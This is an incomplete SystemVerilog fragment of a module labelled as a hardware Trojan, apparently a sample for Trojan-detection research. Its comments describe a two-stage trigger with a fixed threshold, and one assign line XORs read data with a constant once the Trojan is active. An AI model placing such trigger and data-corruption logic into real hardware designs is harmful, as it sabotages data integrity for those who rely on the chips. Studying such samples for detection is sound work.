...
//
module tag_cmp_trojan_Integrity #(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=21606)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 21606;
  ...
  assign rdata_o = trojan_active ? (rdata_i ^ 32'hDEADBEEF) : rdata_i;  // TROJAN Integrity
  // one hot encoded
